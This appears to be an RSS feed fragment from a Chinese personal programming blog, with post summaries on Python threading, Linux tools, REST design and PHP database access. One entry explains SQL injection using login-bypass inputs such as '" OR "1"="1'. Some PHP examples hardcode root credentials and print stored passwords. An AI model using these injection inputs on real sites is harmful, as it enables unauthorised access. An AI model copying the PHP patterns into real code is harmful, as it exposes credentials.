      <description>1.问题 python 多线程一般使用 threading 模块，但 threading 模块有个问题，无法直接返回线程里面运行的结果，那如果需要线程返回值那如何处理呢
2.方法一 通过自定义线程类，继承Thread类，并复写run方法，在run方法中写入执行函数的方式，并把返回值赋值给result；然后通过调用get_result 获取每个进程的返回值
# 多线程类 class MyThread(Thread): result1 = None result2 = None def __init__(self, func, args=()): super(MyThread, self).__init__() self.func = func self.args = args def run(self): self.result1, self.result2 = self.func(*self.args) # 在执行函数的同时，把结果赋值给result, # 然后通过get_result函数获取返回的结果 def get_result(self): # noinspection PyBroadException try: return self.result1, self.result2 except Exception: return None # 多线程执行函数 def Mss(info, window): result, furl = api_test(info, baseurl) sleep(0.5) # 等待，否则由于子进程过快，主进程未开启进度条，而执行进度条关闭命令导致矛盾 window.close() return result, furl t1 = MyThread(Mss, args=(info, myDia5)) t1.</description>
    </item>
    
    <item>
      <title>Python(11)——多线程的使用</title>
      <link>https://ac-lm.github.io/posts/python/python11%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Sun, 13 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python11%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
      <description>参考原文：python 多线程 @虫师 
 1.单线程 在好些年前操作系统处理问题都是单任务的，我想做听音乐和看电影两件事儿，那么一定要先排一下顺序。
#coding=utf-8 import threading from time import ctime,sleep def music(func): for i in range(2): print &amp;#34;I was listening to %s. %s&amp;#34; %(func,ctime()) sleep(1) def move(func): for i in range(2): print &amp;#34;I was at the %s! %s&amp;#34; %(func,ctime()) sleep(5) if __name__ == &amp;#39;__main__&amp;#39;: music(u&amp;#39;爱情买卖&amp;#39;) move(u&amp;#39;阿凡达&amp;#39;) print &amp;#34;all over %s&amp;#34; %ctime() 我们先听了一首音乐，通过for循环来控制音乐的播放了两次，每首音乐播放需要1秒钟，sleep()来控制音乐播放的时长。接着我们又看了一场电影，每一场电影需要5秒钟，因为太好看了，所以我也通过for循环看两遍。在整个休闲娱乐活动结束后，我通过
print &amp;#34;all over %s&amp;#34; %ctime() 看了一下当前时间，差不多该睡觉了
运行结果：
&amp;gt;&amp;gt;&amp;gt; ======================== RESTART ================================ &amp;gt;&amp;gt;&amp;gt; I was listening to 爱情买卖.</description>
    </item>
    
    <item>
      <title>Python(10)——子类的 super 初始化</title>
      <link>https://ac-lm.github.io/posts/python/python10%E5%AD%90%E7%B1%BB%E7%9A%84-super-%E5%88%9D%E5%A7%8B%E5%8C%96/</link>
      <pubDate>Sat, 12 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python10%E5%AD%90%E7%B1%BB%E7%9A%84-super-%E5%88%9D%E5%A7%8B%E5%8C%96/</guid>
      <description>1.使用场景 class mywindow(QtWidgets.QMainWindow, Ui_MainWindow): def __init__(self): super(mywindow, self).__init__() self.setupUi(self) # 寻找 mywindow 的父类 QtWidgets.QMainWindow 中的 __init__()，进行对 mywindow 的初始化 2.解析 # python 中的 super(Net, self).__init__() 其执行时 # 首先找到 Net 的父类（比如是类 NNet），然后把类 Net 的对象 self 转换为类 NNet 的对象，然后“被转换”的类 NNet 对象调用自己的 init函数 这是对继承自父类的属性进行初始化，使用父类的初始化方法来初始化继承的属性。</description>
    </item>
    
    <item>
      <title>Python(9)——异常信息打印</title>
      <link>https://ac-lm.github.io/posts/python/python9%E5%BC%82%E5%B8%B8%E4%BF%A1%E6%81%AF%E6%89%93%E5%8D%B0/</link>
      <pubDate>Fri, 11 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python9%E5%BC%82%E5%B8%B8%E4%BF%A1%E6%81%AF%E6%89%93%E5%8D%B0/</guid>
      <description>1. 直接打印错误 # noinspection PyBroadException (pycharm 警告注释) try: pass except KeyboardInterrupt: print(&amp;#34;quit&amp;#34;) except Exception as ex: print(&amp;#34;出现如下异常%s&amp;#34;%ex) #--------------------------------------------------- try: 2/0 except Exception as e: print(e) 2. 用traceback模块打印 上述方式看不到具体错误的信息，如行数，不便于调试的时候定位，因此可以使用traceback模块
import traceback try: 2/0 except Exception as e: traceback.print_exc() 结果为：
Traceback (most recent call last): File &amp;#34;c:\Users\Administrator\Desktop\test1.py&amp;#34;, line 3, in &amp;lt;module&amp;gt; 2/0 ZeroDivisionError: division by zero 结果如同出错时在命令行中报错一样打印信息
 traceback.print_exc() 是直接打印错误 traceback.format_exc() 则返回字符串 即 traceback.print_exc() === print ( traceback.format_exc())  </description>
    </item>
    
    <item>
      <title>随记(19)——什么是SQL漏洞</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B019%E4%BB%80%E4%B9%88%E6%98%AF-sql-%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Fri, 11 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B019%E4%BB%80%E4%B9%88%E6%98%AF-sql-%E6%BC%8F%E6%B4%9E/</guid>
      <description>要了解sql漏洞，首先要搞清楚sql语句。sql 全称 Structured Query Language(结构化查询语言)，是一种应用于数据库查询的编程语言。
SELECT * FROM admin WHERE user = &amp;#34;test&amp;#34; AND pass = &amp;#34;123456&amp;#34;; 这一句就是从admin表中查找 user为test 并且 pass为123456 的记录，并将满足要求的记录输出。但是如果我输入的密码是 &amp;quot; OR &amp;ldquo;1&amp;rdquo;=&amp;ldquo;1 ，用户名是 test ，那么sql语句则变为
SELECT * FROM admin WHERE user = &amp;#34;test&amp;#34; AND pass = &amp;#34;&amp;#34; OR &amp;#34;1&amp;#34;=&amp;#34;1&amp;#34;; 很明显，WHERE后的表达式一定返回true，于是mysql会将每条记录都输出，而网站误以为这个用户名是正确的，然后让你以test的身份登录。如果网站还设有管理权限，那么你可以试试密码为 &amp;quot; OR &amp;ldquo;1&amp;rdquo;=&amp;ldquo;1&amp;rdquo; AND writable = TRUE AND &amp;ldquo;&amp;quot;=&amp;quot;，这样，sql查询语句就是
SELECT * FROM admin WHERE user = &amp;#34;test&amp;#34; AND pass = &amp;#34;&amp;#34; OR &amp;#34;1&amp;#34;=&amp;#34;1&amp;#34; AND writable = TRUE AND &amp;#34;&amp;#34;=&amp;#34;&amp;#34;; 其中 user = &amp;ldquo;test&amp;rdquo; AND pass = &amp;quot;&amp;rdquo; OR &amp;ldquo;1&amp;rdquo;=&amp;ldquo;1&amp;rdquo; 始终返回true，所以实际条件为 writable = TRUE AND &amp;ldquo;&amp;quot;=&amp;quot;&amp;quot;，即writable = TRUE，于是mysql会将writable为true的记录输出。</description>
    </item>
    
    <item>
      <title>Python(8)——字典取值</title>
      <link>https://ac-lm.github.io/posts/python/python8%E5%AD%97%E5%85%B8%E5%8F%96%E5%80%BC/</link>
      <pubDate>Thu, 10 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python8%E5%AD%97%E5%85%B8%E5%8F%96%E5%80%BC/</guid>
      <description>1.取键：keys() bb={&amp;#39;人才/可怕&amp;#39;:23,&amp;#39;伏地魔&amp;amp;波特&amp;#39;:&amp;#39;army&amp;#39;,&amp;#39;哈哈哈,人才,回合&amp;#39;:&amp;#39;hhh&amp;#39;} for ii in bb.keys(): print(ii) #--输出------------------------------------------------------------------------- 人才/可怕 伏地魔&amp;amp;波特 哈哈哈,人才,回合 2.取值：values() for jj in bb.values(): print(jj) #--输出------------------------------------------------------------------------- 23 army hhh 4.取 键.值 对：items() for kk,vv in bb.items(): print(kk, vv) #---输出------------------------------------------------------------------------ 人才/可怕 23 伏地魔&amp;amp;波特 army 哈哈哈,人才,回合 hhh 5.获取指定键的值 c = bb.get(&amp;#39;人才&amp;#39;,&amp;#39;没有找到该键&amp;#39;) print(c) cc = bb.get(&amp;#39;人才/可怕&amp;#39;,&amp;#39;没有找到该键&amp;#39;) print(cc) #----输出------------------------------------------------------------------------ 没有找到该键 23 6.获取值，并且pop出这一键值对 d = bb.pop(&amp;#39;人才&amp;#39;,&amp;#39;pop失败&amp;#39;) print(d) dd = bb.pop(&amp;#39;人才/可怕&amp;#39;,&amp;#39;pop失败&amp;#39;) print(dd) print(bb) #----输出----------------------------------------------------------------------- pop失败 23 ！！字典变化了！！ </description>
    </item>
    
    <item>
      <title>随记(18)——什么是Bash Shell</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B018%E4%BB%80%E4%B9%88%E6%98%AF-bash-shell/</link>
      <pubDate>Wed, 09 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B018%E4%BB%80%E4%B9%88%E6%98%AF-bash-shell/</guid>
      <description>1.什么是Bash Bash是Unix shell的一种，运行于大多数类Unix系统的操作系统之上，Linux与Mac OS都将它作为默认shell。
此外Bash是一个命令处理器，通常运行于文本窗口中，并能执行用户直接输入的命令。Bash还能从文件中读取命令。
2.什么是Shell 在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它接收用户命令，然后调用相应的应用程序。
同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。
Shell是操作系统最外面的一层，是文字操作系统与外部最主要的接口，Shell管理你与操作系统之间的交互：等待你输入，向操作系统解释你的输入，并且处理各种各样的操作系统的输出结果。
3.Shell的两大类 一：图形界面shell（Graphical User Interface shell 即 GUI shell） 例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。
二：命令行式shell（Command Line Interface shell ，即CLI shell） 例如：bash / sh / ksh / csh / zsh（Unix/linux 系统）（MS-DOS系统），cmd.exe / 命令提示字符（Windows NT 系统），Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）
三：主流的Shell  Bourne Shell：首个重要的标准Unix Shell，是UNIX 最初使用的 shell，并且在每种 UNIX 上都可以使用, 在 shell 编程方面相当优秀，但在处理与用户的交互方面做得不如其他几种Shell C Shell：首个交互式功能Shell，并把ALGOL风格的语法结构变成了C语言风格 Korn Shell：ksh结合了所有的C shell的交互式特性，并融入了Bourne shell的语法（Bourne shell用来编程，C shell用来交互） Bourne Again Shell (bash)：替代Bourne shell POSIX Shell：Korn shell的一个变种，主要为hp(惠普)提供  4.</description>
    </item>
    
    <item>
      <title>随记(17)——Linux最多支持多少TCP连接</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B017linux-%E6%9C%80%E5%A4%9A%E6%94%AF%E6%8C%81%E5%A4%9A%E5%B0%91-tcp-%E8%BF%9E%E6%8E%A5/</link>
      <pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B017linux-%E6%9C%80%E5%A4%9A%E6%94%AF%E6%8C%81%E5%A4%9A%E5%B0%91-tcp-%E8%BF%9E%E6%8E%A5/</guid>
      <description>参考原文：一台Linux服务器最多能支撑多少个TCP连接？ @PHP饭米粒 
 1.并发问题 在网络开发中，有这样一个基础问题始终没有彻底搞明白。那就是一台服务器最大究竟能支持多少个网络连接？
很多同学看到这个问题的第一反应是65535。原因是：“听说端口号最多有65535个，那长连接就最多保持65535个了”。是这样的吗？还有的人说：“应该受TCP连接里四元组的空间大小限制，算起来是200多万亿个！”
2.一次关于服务器端并发的聊天 &amp;ldquo;TCP连接四元组是源IP地址、源端口、目的IP地址和目的端口。任意一个元素发生了改变，那么就代表的是一条完全不同的连接了。拿我的Nginx举例，它的端口是固定使用80。另外我的IP也是固定的，这样目的IP地址、目的端口都是固定的。剩下源IP地址、源端口是可变的。所以理论上我的Nginx上最多可以建立2的32次方（ip数）×2的16次方（port数）个连接。这是两百多万亿的一个大数字！！&amp;rdquo;
&amp;ldquo;进程每打开一个文件（linux下一切皆文件，包括socket），都会消耗一定的内存资源。如果有不怀好心的人启动一个进程来无限的创建和打开新的文件，会让服务器崩溃。所以linux系统出于安全角度的考虑，在多个位置都限制了可打开的文件描述符的数量，包括系统级、用户级、进程级。这三个限制的含义和修改方式如下：&amp;rdquo;
 系统级：当前系统可打开的最大数量，通过fs.file-max参数可修改 用户级：指定用户可打开的最大数量，修改/etc/security/limits.conf 进程级：单个进程可打开的最大数量，通过fs.nr_open参数可修改  &amp;ldquo;我的接收缓存区大小是可以配置的，通过sysctl命令就可以查看。&amp;rdquo;
$ sysctl -a | grep rmemnet.ipv4.tcp_rmem = 4096 87380 8388608net.core.rmem_default = 212992net.core.rmem_max = 8388608&amp;ldquo;其中在tcp_rmem&amp;quot;中的第一个值是为你们的TCP连接所需分配的最少字节数。该值默认是4K，最大的话8MB之多。也就是说你们有数据发送的时候我需要至少为对应的socket再分配4K内存，甚至可能更大。&amp;rdquo;
&amp;ldquo;TCP分配发送缓存区的大小受参数net.ipv4.tcp_wmem配置影响。&amp;rdquo;
$ sysctl -a | grep wmemnet.ipv4.tcp_wmem = 4096 65536 8388608net.core.wmem_default = 212992net.core.wmem_max = 8388608&amp;ldquo;在net.ipv4.tcp_wmem&amp;quot;中的第一个值是发送缓存区的最小值，默认也是4K。当然了如果数据很大的话，该缓存区实际分配的也会比默认值大。&amp;rdquo;
3.服务器百万连接达成记 “准备啥呢，还记得前面说过Linux对最大文件对象数量有限制，所以要想完成这个实验，得在用户级、系统级、进程级等位置把这个上限加大。我们实验目的是100W，这里都设置成110W，这个很重要！因为得保证做实验的时候其它基础命令例如ps，vi等是可用的。“
活动连接数量确实达到了100W：
$ ss -n | grep ESTAB | wc -l 1000024当前机器内存总共是3.9GB，其中内核Slab占用了3.2GB之多。MemFree和Buffers加起来也只剩下100多MB了：
$ cat /proc/meminfoMemTotal: 3922956 kBMemFree: 96652 kBMemAvailable: 6448 kBBuffers: 44396 kB.</description>
    </item>
    
    <item>
      <title>随记(16)——RESTful API接口设计</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B016restful-api-%E6%8E%A5%E5%8F%A3%E8%AE%BE%E8%AE%A1/</link>
      <pubDate>Sun, 06 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B016restful-api-%E6%8E%A5%E5%8F%A3%E8%AE%BE%E8%AE%A1/</guid>
      <description>原文参考：RESTful API 设计指南 @阮一峰 
 1.API 接口的产生 网络应用程序，分为前端和后端两个部分。当前的发展趋势，就是前端设备层出不穷（手机、平板、桌面电脑、其他专用设备&amp;hellip;&amp;hellip;）。因此，必须有一种统一的机制，方便不同的前端设备与后端进行通信。这导致API构架的流行，甚至出现 API First 的设计思想。RESTful API 是目前比较成熟的一套互联网应用程序的API设计理论。
2.API 应部署在域名下 应该尽量将API部署在专用域名之下。
https://api.example.com如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。
https://example.org/api/3.API 版本应放在URL中 应该将API的版本号放入URL。
https://api.example.com/v1/另一种做法是，将版本号放在HTTP头信息中，但不如放入URL方便和直观。Github 采用这种做法。
4.API 的路径 路径又称&amp;quot;终点&amp;quot;（endpoint），表示API的具体网址。
在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的&amp;quot;集合&amp;quot;（collection），所以API中的名词也应该使用复数。
举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样。
 https://api.example.com/v1/zoos https://api.example.com/v1/animals https://api.example.com/v1/employees  5.HTTP 动词-资源请求 常用的HTTP动词有下面五个（括号里是对应的SQL命令）。
 GET（SELECT）：从服务器取出资源（一项或多项）。 POST（CREATE）：在服务器新建一个资源。 PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。 PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。 DELETE（DELETE）：从服务器删除资源。  还有两个不常用的HTTP动词。
 HEAD：获取资源的元数据。 OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。  下面是一些例子。
 GET /zoos：列出所有动物园 POST /zoos：新建一个动物园 GET /zoos/ID：获取某个指定动物园的信息 PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息） PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息） DELETE /zoos/ID：删除某个动物园 GET /zoos/ID/animals：列出某个指定动物园的所有动物 DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物  6.</description>
    </item>
    
    <item>
      <title>Web开发(4)——JS 实现页面跳转</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%914js-%E5%AE%9E%E7%8E%B0%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/</link>
      <pubDate>Sat, 05 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%914js-%E5%AE%9E%E7%8E%B0%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/</guid>
      <description>1 页面跳转（原页面跳转） （1）a标签实现 &amp;lt;a href=&amp;#34;https://www.baidu.com&amp;#34;&amp;gt;BAT&amp;lt;/a&amp;gt; （2）window.location.href实现 window.location.href=&amp;#34;https://www.baidu.com&amp;#34;; 2 页面跳转 （打开新标签页） （1）a标签实现 &amp;lt;a href=&amp;#34;https://www.baidu.com&amp;#34; target=&amp;#34;_blank&amp;#34;&amp;gt;BAT&amp;lt;/a&amp;gt; （2）window.open()实现 window.open(&amp;#34;https://www.baidu.com&amp;#34;); </description>
    </item>
    
    <item>
      <title>Linux(13)——rpm 软件管理工具</title>
      <link>https://ac-lm.github.io/posts/linux/linux13rpm-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Fri, 04 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux13rpm-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</guid>
      <description>在 Linux 操作系统下，几乎所有的软件都可以通过 rpm 进行安装、卸载及管理等操作。rpm 的全称为Redhat Package Manager ，是由Redhat 公司提出的，用于管理Linux 下软件包的软件。
1.安装 rpm -i example.rpm #安装 example.rpm 包； rpm -iv example.rpm #安装 example.rpm 包并在安装过程中显示正在安装的文件信息； rpm -ivh example.rpm #安装 example.rpm 包并在安装过程中显示正在安装的文件信息及安装进度 2.删除 rpm -e example #注意：软件包名是example，而不是rpm文件名&amp;#34;example.rpm&amp;#34; 3.升级 rpm -Uvh example.rpm #注意：rpm会自动卸载相应软件包的老版本。如果老版本软件的配置文件与新版本的不兼容，rpm会自动将其保存为另外一个文件，用户会看到下面的信息：saving /etc/example.conf as /etc/example.conf.rpmsave，用户就可以自己手工去更改相应的配置文件 #注意：如果用户要安装老版本的软件，会看到下面的出错信息：error:example.rpm cannot be installed，强行安装要使用-oldpackage参数。 4.查询 rpm -qa | grep clickhouse #用户可以用 rpm -q 在rpm的数据库中查询相应的软件，rpm会给出软件包的名称，版本，发布版本号 ----- 可用参数 --------------------------------------------- -a #查询目前系统安装的所有软件包。 -f 文件名 #查询包括该文件的软件包。 -F #同-f参数，只是输入是标准输入（例如 find /usr/bin | rpm -qF) -q 软件包名 #查询该软件包 -Q #同-p参数，只是输入是标准输入（例如 find /mnt/cdrom/RedHat/RPMS | rpm -qQ) -i #显示软件包的名称，描述，发行，大小，编译日期，安装日期，开发人员等信息。 -l #显示软件包包含的文件 -s #显示软件包包含的文件目前的状态，只有两种状态：normal和missing -d #显示软件包中的文档（如man,info,README等） -c #显示软件包中的配置文件，这些文件一般是安装后需要用户手工修改的，例如：sendmail.</description>
    </item>
    
    <item>
      <title>Web开发(3)——PHP&#43;MariaDB 数据库操作</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%913php&#43;mariadb-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Fri, 04 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%913php&#43;mariadb-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</guid>
      <description>1.连接数据库 &amp;lt;?php if (extension_loaded(&amp;#39;mysqli&amp;#39;)){ echo &amp;#39;yes&amp;#39;; } else{ echo &amp;#39;no&amp;#39;; } # mysqli组件是否已经被加载  $db = new mysqli(&amp;#39;localhost&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;admin&amp;#39;, &amp;#39;test&amp;#39;); #数据库地址，用户名，密码，表单  if (mysqli_connect_errno()){ echo &amp;#39;&amp;lt;p&amp;gt;&amp;#39; . &amp;#39;Connect DB error&amp;#39;; exit; } #数据库是否连接 ?&amp;gt;2.一个用户注册和系统登录 a、创建数据库、表和用户。 DROP DATABASE IF EXISTS `test`; CREATE DATABASE `test` USE `test`; DROP TABLE IF EXISTS `tbl_user`; CREATE TABLE `tbl_user` ( `username` varchar(32) NOT NULL default &amp;#39;&amp;#39;, `password` varchar(32) NOT NULL default &amp;#39;&amp;#39;, PRIMARY KEY (`username`) ) ENGINE=InnoDB DEFAULT CHARSET=gb2312; c、注册的代码： # register_do.</description>
    </item>
    
    <item>
      <title>BUG(9)——AndroidCMD 工具安装 SDK 路径无法识别</title>
      <link>https://ac-lm.github.io/posts/bug/bug9androidcmd-%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85-sdk-%E8%B7%AF%E5%BE%84%E6%97%A0%E6%B3%95%E8%AF%86%E5%88%AB/</link>
      <pubDate>Thu, 03 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug9androidcmd-%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85-sdk-%E8%B7%AF%E5%BE%84%E6%97%A0%E6%B3%95%E8%AF%86%E5%88%AB/</guid>
      <description>BUG 描述 执行 Android cmd 工具 sdkmanager 命令时无法找到对应路径
Error: Could not determine SDK root. Error: Either specify it explicitly with --sdk_root= or move this package into its expected location: \cmdline-tools\latest\ Resolution Since new updates, there are some changes that are not mentioned in the documentation. After unzipping the command line tools package, the top-most directory you&amp;rsquo;ll get is cmdline-tools.
Rename the unpacked directory from cmdline-tools to tools, and place it under $C:/Android/cmdline-tools</description>
    </item>
    
    <item>
      <title>Linux(12)——MTR 链路测试工具</title>
      <link>https://ac-lm.github.io/posts/linux/linux12mtr-%E9%93%BE%E8%B7%AF%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Thu, 03 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux12mtr-%E9%93%BE%E8%B7%AF%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</guid>
      <description>当客户端访问目标服务器或负载均衡，使用ping命令测试出现丢包或不通时，可以通过MTR等工具进行链路测试来判断问题来源。
1.MTR  MTR（My traceroute）是几乎所有Linux发行版本预装的网络测试工具，此工具也有对应的Windows版本，名称为WinMTR。 MTR工具将ping和traceroute命令的功能并入了同一个工具中，实现更强大的功能。 Linux版本的mtr命令默认发送ICMP数据包进行链路探测。可以通过“-u”参数来指定使用UDP数据包用于探测。 相对于traceroute命令只会做一次链路跟踪测试，mtr命令会对链路上的相关节点做持续探测并给出相应的统计信息。所以，mtr命令能避免节点波动对测试结果的影响，所以其测试结果更正确，建议优先使用。  2.MTR的使用 mtr 192.168.1.243默认配置下，返回结果中各数据列的说明如下。
 第一列（Host）：节点IP地址和域名。如前面所示，按n键可以切换显示。 第二列（Loss%）：节点丢包率。 第三列（Snt）：每秒发送数据包数。默认值是10，可以通过参数“-c”指定。 第四列（Last）：最近一次的探测延迟值。 第五、六、七列（Avg、Best、Wrst）：分别是探测延迟的平均值、最小值和最大值。 第八列（StDev）：标准偏差。越大说明相应节点越不稳定。  </description>
    </item>
    
    <item>
      <title>Web开发(2)——PHP 实例</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%912php-%E5%AE%9E%E4%BE%8B/</link>
      <pubDate>Thu, 03 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%912php-%E5%AE%9E%E4%BE%8B/</guid>
      <description>1.PHP 信息页 &amp;lt;?php phpinfo();?&amp;gt;2.数据库连接实现 &amp;lt;?php $db = new mysqli(&amp;#39;localhost&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;123456&amp;#39;, &amp;#39;ztest&amp;#39;); if (mysqli_connect_errno()) { echo &amp;#39;&amp;lt;p&amp;gt;&amp;#39; . &amp;#39;Connect DB error&amp;#39;; exit; } else { echo &amp;#39;&amp;lt;p&amp;gt;&amp;#39; . &amp;#39;Connect DB success&amp;#39;; } echo &amp;#39;&amp;lt;p&amp;gt;&amp;#39; . &amp;#39;Test start&amp;#39;; $query = &amp;#34;select * from login&amp;#34;; $result=$db-&amp;gt;query($query); if ($result-&amp;gt;num_rows &amp;gt; 0) { // 输出数据  while($row = $result-&amp;gt;fetch_assoc()) { echo &amp;#34;&amp;lt;p&amp;gt;&amp;#34; . &amp;#34;username: &amp;#34; . $row[&amp;#34;username&amp;#34;]. &amp;#34; - password: &amp;#34; . $row[&amp;#34;password&amp;#34;]; } } else { echo &amp;#34;0 结果&amp;#34;; } $db-&amp;gt;close(); ?</description>
    </item>
    
    <item>
      <title>BUG(7)——Win10 锁屏问题</title>
      <link>https://ac-lm.github.io/posts/bug/bug7win10-%E9%94%81%E5%B1%8F%E9%97%AE%E9%A2%98/</link>
      <pubDate>Wed, 02 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug7win10-%E9%94%81%E5%B1%8F%E9%97%AE%E9%A2%98/</guid>
      <description>BUG描述 Windows10 在锁屏时会偶尔出现不是自己设置的图片的问题，锁屏会变为默认图片。怀疑是由于用户的缓存被清理，启动时变为了默认用户。
Resolution Win+R 打开运行，输入%ProgramData%\Microsoft\Windows打开 Win10 配置文件夹，寻找到SystemData文件夹，双击打开。
若没有权限，右键-&amp;gt;属性-&amp;gt;安全-&amp;gt;高级-&amp;gt;上面栏的所有者更改-&amp;gt;输入用户名(登陆账号名如LM)-&amp;gt;检查名称-&amp;gt;确认用户-&amp;gt;确认-&amp;gt;替换子容器和对象的所有者-&amp;gt;确定-&amp;gt;成功获取权限
进入SystemData，发现存在形如S-1-5-18和S-1-5-21-的文件夹(为用户的锁屏配置文件)，S-1-5-18为默认配置，打开S-1-5-21-&amp;gt;ReadOnly，目录下LockScreen_W，LockScreen_B即为锁屏图片。LockScreen_B为用户设置，LockScreen_W为默认，即注销后的锁屏，更改文件内容以修改锁屏</description>
    </item>
    
    <item>
      <title>BUG(8)——SSH无法连接虚拟机Linux系统</title>
      <link>https://ac-lm.github.io/posts/bug/bug8ssh-%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA-linux/</link>
      <pubDate>Wed, 02 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug8ssh-%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA-linux/</guid>
      <description>BUG描述 无法使用 SSH 连接虚拟机，使用 Ping 指令，能从虚拟机中 Ping 通主机，但不能从外部主机 Ping 通虚拟机。
Resolution 注意网关配置的问题，查看网关是否错误，可以打开网络适配器，右键虚拟网卡，诊断，重置网卡，重新配置网关。</description>
    </item>
    
    <item>
      <title>PyQt5(1)——安装</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt51%E5%AE%89%E8%A3%85/</link>
      <pubDate>Tue, 01 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt51%E5%AE%89%E8%A3%85/</guid>
      <description>安装库与工具 PyQt5 是对 Qt 所有类的 Python 封装，结合 Python 简洁的语法，用户可以使用 PyQt5 高效、简单地开发出自己想要的程序。
pip install PyQt5 pip install PyQt5-tools QTdesigner 路径：Lib\site-packages\qt5_applications\Qt\bin\designer.exe</description>
    </item>
    
    <item>
      <title>随记(15)——WebDriver click与JavaScript click的区别</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B015webdriver-click-%E4%B8%8E-javascript-click-%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Tue, 01 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B015webdriver-click-%E4%B8%8E-javascript-click-%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>原文参考：webdriver-click-vs-javascript-click @stackoverflow 
 问题出现 在自动测试时有时候会出现无法通过 selenium WebDriver 点击命令来单击元素，完成操作，但是可以通过执行JavaScript来单击该元素来解决这个问题。
